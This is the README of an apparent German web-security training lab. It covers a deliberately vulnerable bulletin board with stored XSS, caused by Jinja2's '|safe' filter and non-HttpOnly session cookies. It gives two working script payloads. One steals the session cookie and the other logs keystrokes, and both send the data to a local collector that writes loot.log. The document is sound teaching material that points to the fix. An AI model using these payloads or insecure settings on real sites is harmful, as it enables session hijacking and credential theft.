# Ordner 10 — Stored XSS im Anschlagbrett (⚠️ verwundbar)

Das Board rendert Beiträge mit `{{ post.content|safe }}` — das Auto-Escaping ist aus.
Ein als Aushang gespeichertes `<script>` läuft im Browser **jedes** Lesers (Stored XSS).
Zusätzlich ist `SESSION_COOKIE_HTTPONLY = False`, damit der Cookie-Klau sichtbar wird.
Fix in **Ordner 11**.

> Nur gegen die eigene Lab-Instanz. Ideal fürs Gruppen-Lab: Reiter A postet den Payload,
> Reiter B liest das Board und wird „getroffen".

## Aufbau
```powershell
pip install -r requirements.txt
python seed.py
python app.py            # Forum auf :5000
# zweites Fenster:
python collector.py      # Angreifer-Sammelstelle auf :5001 -> loot.log
```

## Szenario 1 — Cookie-Klau
Als eingeloggter User einen Aushang mit diesem Inhalt posten:
```html
<script>new Image().src="http://127.0.0.1:5001/steal?c="+encodeURIComponent(document.cookie)</script>
```
Sobald ein anderer eingeloggter Reiter das Board öffnet, landet dessen Session-Cookie
in `loot.log`. Mit dem Cookie kann der Angreifer die Session übernehmen
(Session-Hijacking; verwandt mit Ordner 13).

## Szenario 2 — Keylogger
```html
<script>document.addEventListener('keydown',e=>{new Image().src="http://127.0.0.1:5001/keys?k="+encodeURIComponent(e.key)})</script>
```
Jeder Tastendruck der Opfer auf der Board-Seite wird an den Collector geschickt.

## Warum das geht
`|safe` sagt Jinja2: „nicht escapen". Damit wird User-Input als HTML/JS interpretiert.
Der eigentliche Fehler ist, **Ausgabe** nicht zu escapen (nicht die Eingabe zu filtern).

## Nächster Schritt
**Ordner 11:** Fix — Auto-Escaping an (`|safe` weg), `HttpOnly`-Cookie, und eine
**Content-Security-Policy**, die inline-Skripte blockt.
